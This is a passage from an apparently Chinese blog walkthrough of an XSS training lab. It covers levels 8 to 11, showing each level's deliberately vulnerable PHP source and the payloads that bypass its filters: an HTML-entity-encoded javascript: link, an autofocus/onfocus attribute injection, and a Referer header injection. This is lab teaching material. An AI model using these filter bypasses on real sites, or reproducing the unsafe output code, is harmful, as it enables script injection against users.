punctuation\">\"</span>content-type<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">content</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text/html;charset=utf-8<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\"></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>window<span class=\"token punctuation\">.</span><span class=\"token function-variable function\">alert</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#123;</span>     </pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token function\">confirm</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"完成的不错！\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre> window<span class=\"token punctuation\">.</span>location<span class=\"token punctuation\">.</span>href<span class=\"token operator\">=</span><span class=\"token string\">\"level9.php?keyword=not bad!\"</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">></span></span>欢迎来到level8<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>h1</span> <span class=\"token attr-name\">align</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>center</span><span class=\"token punctuation\">></span></span>欢迎来到level8<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>h1</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token function\">ini_set</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"display_errors\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token variable\">$str</span> <span class=\"token operator\">=</span> <span class=\"token function\">strtolower</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"keyword\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token variable\">$str2</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"script\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"scr_ipt\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token variable\">$str3</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"on\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"o_n\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$str2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token variable\">$str4</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"src\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"sr_c\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$str3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token variable\">$str5</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"data\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"da_ta\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$str4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token variable\">$str6</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"href\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"hr_ef\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$str5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token variable\">$str7</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'\"'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'&amp;quot'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$str6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;center></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>&lt;form action=level8.php method=GET></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>&lt;input name=keyword  value=\"'</span><span class=\"token operator\">.</span><span class=\"token function\">htmlspecialchars</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\"></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>&lt;input type=submit name=submit value=添加友情链接 /></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>&lt;/form></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>&lt;/center>'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre> <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;center>&lt;BR>&lt;a href=\"'</span><span class=\"token operator\">.</span><span class=\"token variable\">$str7</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\">友情链接&lt;/a>&lt;/center>'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>center</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>img</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>level8.jpg</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>center</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;h3 align=center>payload的长度:\"</span><span class=\"token operator\">.</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str7</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"&lt;/h3>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><p><code>strtolower把字符串转换为小写</code></p>\n<p><code>$str = strtolower($_GET[&quot;keyword&quot;]);</code></p>\n<p><code>$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);</code></p>\n<p><code>$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</code></p>\n<p><code>$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);</code></p>\n<p><code>$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);</code></p>\n<p><code>$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);</code></p>\n<p><code>$str7=str_replace('&quot;','&amp;quot',$str6);</code></p>\n<p><code>被替换.htmlspecialchars($str)转义</code></p>\n<h4 id=\"第九关\"><a class=\"markdownIt-Anchor\" href=\"#第九关\">#</a> <span class=\"label\">第九关</span></h4>\n<p>输入上关的显示链接不合法</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/25.png\" alt=\"\"></p>\n<p>输入一个链接</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/26.png\" alt=\"\"></p>\n<p>还是不合法显示</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/27.png\" alt=\"\"></p>\n<p><code>加上http://gyzero.shop成功跳转，那就是检测了有没有http://没有就报错</code></p>\n<p><code>在上一关基础上添加http://</code></p>\n<p><code>javascript:alert(1);//http:// 并且用//把http://注释掉</code></p>\n<p><code>&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&amp;#59;//http://</code></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/28.png\" alt=\"\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/29.png\" alt=\"\"></p>\n<p>成功弹窗</p>\n<p><span class=\"label\">👁代码分析</span></p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">html</span><span class=\"token punctuation\">></span></span><span class=\"token comment\">&lt;!--STATUS OK--></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">http-equiv</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>content-type<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">content</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text/html;charset=utf-8<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\"></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>window<span class=\"token punctuation\">.</span><span class=\"token function-variable function\">alert</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#123;</span>     </pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token function\">confirm</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"完成的不错！\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre> window<span class=\"token punctuation\">.</span>location<span class=\"token punctuation\">.</span>href<span class=\"token operator\">=</span><span class=\"token string\">\"level10.php?keyword=well done!\"</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">></span></span>欢迎来到level9<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>h1</span> <span class=\"token attr-name\">align</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>center</span><span class=\"token punctuation\">></span></span>欢迎来到level9<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>h1</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token function\">ini_set</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"display_errors\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token variable\">$str</span> <span class=\"token operator\">=</span> <span class=\"token function\">strtolower</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"keyword\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token variable\">$str2</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"script\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"scr_ipt\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token variable\">$str3</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"on\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"o_n\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$str2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token variable\">$str4</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"src\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"sr_c\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$str3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token variable\">$str5</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"data\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"da_ta\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$str4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token variable\">$str6</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"href\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"hr_ef\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$str5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token variable\">$str7</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'\"'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'&amp;quot'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$str6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;center></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>&lt;form action=level9.php method=GET></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>&lt;input name=keyword  value=\"'</span><span class=\"token operator\">.</span><span class=\"token function\">htmlspecialchars</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\"></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>&lt;input type=submit name=submit value=添加友情链接 /></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>&lt;/form></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>&lt;/center>'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token constant boolean\">false</span><span class=\"token operator\">===</span><span class=\"token function\">strpos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str7</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'http://'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>  <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;center>&lt;BR>&lt;a href=\"您的链接不合法？有没有！\">友情链接&lt;/a>&lt;/center>'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>  <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;center>&lt;BR>&lt;a href=\"'</span><span class=\"token operator\">.</span><span class=\"token variable\">$str7</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\">友情链接&lt;/a>&lt;/center>'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>center</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>img</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>level9.png</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>center</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;h3 align=center>payload的长度:\"</span><span class=\"token operator\">.</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str7</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"&lt;/h3>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>增加了一个判断如果str7含有http://则添加成功如果没有则报错您的链接不合法？有没有！</pre></td></tr><tr><td data-num=\"50\"></td><td><pre>if(false===strpos($str7,'http://'))</pre></td></tr><tr><td data-num=\"51\"></td><td><pre>&#123;</pre></td></tr><tr><td data-num=\"52\"></td><td><pre>  echo '<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>center</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>BR</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>您的链接不合法？有没有！<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>友情链接<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>center</span><span class=\"token punctuation\">></span></span>';</pre></td></tr><tr><td data-num=\"53\"></td><td><pre>        &#125;</pre></td></tr><tr><td data-num=\"54\"></td><td><pre>else</pre></td></tr><tr><td data-num=\"55\"></td><td><pre>&#123;</pre></td></tr><tr><td data-num=\"56\"></td><td><pre>  echo '<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>center</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>BR</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token punctuation\">'</span>.$str7.'<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>友情链接<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>center</span><span class=\"token punctuation\">></span></span>';</pre></td></tr><tr><td data-num=\"57\"></td><td><pre>&#125;</pre></td></tr></table></figure><h4 id=\"第九关-2\"><a class=\"markdownIt-Anchor\" href=\"#第九关-2\">#</a> <span class=\"label\">第九关</span></h4>\n<p>输入’&quot;&lt;&gt;script javascript 只有 &lt;&gt; 被过滤了</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/30.png\" alt=\"\"></p>\n<p>三个隐藏域</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/31.png\" alt=\"\"></p>\n<p>添加参数</p>\n<p>t_sort 输入的被传回前端</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/32.png\" alt=\"\"></p>\n<p>&amp;t_sort=&quot; type=“text” autofocus onfocus=alert(1)//</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/33.png\" alt=\"\"></p>\n<h4 id=\"第十一关\"><a class=\"markdownIt-Anchor\" href=\"#第十一关\">#</a> <span class=\"label\">第十一关</span></h4>\n<p>多了一个</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/34.png\" alt=\"\"></p>\n<p>t_ref  获取 http referer</p>\n<p>更改 referer</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/35.png\" alt=\"\"></p>\n<p>成功弹窗</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/36.png\" alt=\"\"></p>\n<p><span class=\"label\">👁代码分析</span></p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">html</span><span class=\"token punctuation\">></span></span><span class=\"token comment\">&lt;!--STATUS OK--></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">http-equiv</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>content-type<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">content</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text/html;charset=utf-8<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\"></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>window<span class=\"token punctuation\">.</span><span class=\"token function-variable function\">alert</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#123;</span>     </pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token function\">confirm</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"完成的不错！\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre> window<span class=\"token punctuation\">.</span>location<span class=\"token punctuation\">.</span>href<span class=\"token operator\">=</span><span class=\"token string\">\"level12.php?keyword=good job!\"</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span 